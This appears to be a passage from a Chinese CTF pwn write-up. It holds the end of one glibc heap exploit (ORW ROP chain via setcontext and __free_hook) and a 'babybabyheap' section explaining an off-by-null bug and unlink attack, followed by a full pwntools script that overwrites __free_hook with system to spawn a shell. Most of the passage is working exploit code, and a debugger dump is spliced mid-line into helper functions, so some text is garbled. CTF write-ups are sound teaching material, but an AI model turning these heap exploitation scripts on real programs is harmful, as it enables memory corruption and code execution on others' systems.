    orw = flat([
        p_rdi_r, flag_str_address,
        p_rsi_r, 0,
        p_rax_r, 2,
        syscall,
        p_rdi_r, 4,
        p_rsi_r, flag_address,
        p_rdx_r12_r, 0x30, 0,
        p_rax_r, 0,
        syscall,
        p_rdi_r, 1,
        p_rsi_r, flag_address,
        p_rdx_r12_r, 0x30, 0,
        p_rax_r, 1,
        syscall,
        libc.sym['exit']
    ])
    magic = 0x00000000001547a0 + libc.address
    payload = p64(magic) + p64(0)
    payload += p64(libc.sym['setcontext'] + 61)
    payload = payload.ljust(0x90, b"\x00")
    payload += p64(heap_address + 0x5d0 + 0x10) + p64(ret)
    payload += b"./flag\x00"
    delete(0)
    change_des(3, p64(0) + p64(0x111) + p64(libc.sym['__free_hook'] - 0x20))
    change_des(4, p64(0) + p64(0x0002000000000000))
    add(0)
    add(7)
    delete(9)
    add(9)
    change_des(9, orw)
    delete(0)
    change_des(3, p64(0) + p64(0x111) + p64(libc.sym['__free_hook'] - 0x10) + p64(0))
    change_des(4, p64(0) + p64(0x0002000000000000))
    add(0)
    add(6)
    log.success("libc address is {}".format(hex(libc.address)))
    log.success("heap address is {}".format(hex(heap_address)))
    change_des(7, p64(0) + p64(libc.sym['__free_hook'] - 0x10) + payload)
    delete(6)
    p.interactive()
## babybabyheap
首先看一下程序的逻辑，程序提供了四种方法就是`add,show,delete`，还有一个后门函数。`add`函数只能申请`0x7F-0x200`大小的堆块。`delete`删除堆块，`show`函数输出堆块的内容，这三种方法只能在`size_list[index]`中对应位置有数值的情况下才能调用，相当于`size_list[index]`是一个`is_deleted`的判断。
这种情况下就没有`UAF`了，那么此时看一下后门函数，后门函数只能够调用一次
    index = readstr((void *)buf_list[v1], size_list[v1]);
    __int64 __fastcall readstr(void *a1, unsigned int a2)
    {
      unsigned int v3; // [rsp+1Ch] [rbp-4h]
      v3 = read(0, a1, a2);
      if ( *((_BYTE *)a1 + (int)v3 - 1) == 10 )
        *((_BYTE *)a1 + (int)v3 - 1) = 0;
      *((_BYTE *)a1 + (int)v3) = 0;
      return v3;
    }
这里很明显的存在一个`off-by-null`的漏洞，一开始想到的是利用`large bin`构造`off-by-null`漏洞的利用造成堆重叠，但是这里最大只能分配`0x200`的堆块，所以这里无法使用。
对于`off-by-null`的利用方法就是构造堆重叠，那么这里我们主要是绕过下面这两个检查。
    __glibc_unlikely (chunksize(p) != prevsize;
    __builtin_expect (fd->bk != p || bk->fd != p, 0)
程序没有开启地址随机化，因此存储所有堆块地址的`buf_list`的地址我们是知道的，因此这里我们可以直接利用`node_list`伪造`fd,bk`指针，是一个典型的`unlink`的利用。
    pwndbg> x/20gx 0x0000000001d573a0-0x10
    0x1d57390:      0x0000000000000000      0x0000000000000101 
    0x1d57570:      0x6161616161616161      0x6161616161616161
    0x1d57580:      0x6161616161616161      0x6161616161616161
    0x1d57590:      0x00000000000001f0      0x0000000000000100  x/20gx 0x00000000010e9ba0-0x10
    0x10e9b90:      0x0000000000000000      0x0000000000000101 
    0x10e9c30:      0x0000000000000000      0x0000000000000000
    //...
    0x10e9c60:      0x0000000000000000      0x0000000000000000
    0x10e9c70:      0x0000000000000000      0x0000000000000101 > ", "1")
        p.sendlineafter("index?\n", str(index))
        p.sendlineafter("size?\n", str(size))
        p.sendafter("content?\n", content)
    def show(index):
        p.sendlineafter(">> ", "2")
        p.sendlineafter("index?\n", str(index))
    def delete(index):
        p.sendlineafter(">> ", "3")
        p.sendlineafter("index?\n", str(index))
    def back(index, content):
        p.sendlineafter(">> ", "4")
        p.sendafter("Sure to exit?(y/n)\n", "n")
        p.sendlineafter("index?\n", str(index))
        p.sendafter("content?\n", content)
    p.recvuntil("gift: ")
    libc.address = int(p.recvline().strip(), 16) - libc.sym['puts']
    log.success("libc address is {}".format(hex(libc.address)))
    buf_address = 0x404140
    add(0, 0xf8)
    add(1, 0xf8, p64(0) + p64(0x1f1) + p64(buf_address + 0x8 - 0x18) + p64(buf_address + 0x8 - 0x10))
    add(2, 0xf8)
    add(3, 0xf8)
    for i in range(7):
        add(4 + i, 0xf8)
    for i in range(7):
        delete(4 + i)
    back(2, b"a"*0xf0 + p64(0x1f0))
    delete(3)
    add(30-4, 0x91)
    delete(1)
    add(29, 0xf8)
    add(30, 0xf8, b"\x00"*0xd0 + p64(0) + p64(0x101))
    delete(29)
    add(1, 0x88, p32(0xf8)*2 + p64(0) + p64(0x404130)*2)
    show(29)
    heap_address = u64(p.recvline().strip().ljust(8, b"\x00"))
    log.success("heap address is {}".format(hex(heap_address)))
    add(29, 0xf8, b"\x00"*0xd0 + p64(0) + p64(0x21))
    delete(1)
    add(1, 0x88, p32(0xf8)*2 + p64(0) + p64(0x404130)*2 + p64(heap_address + 0x100 + 0xd0 + 0x10))
    delete(29)
    delete(2)
    add(2, 0xf8, b"\x00"*0x18 + p64(0x101) + p64(libc.sym['__free_hook']))
    add(20, 0xf8, b"/bin/sh\x00")
    add(21, 0xf8, p64(libc.sym['system']))
    delete(20)
    p.interactive()
加成券.jpg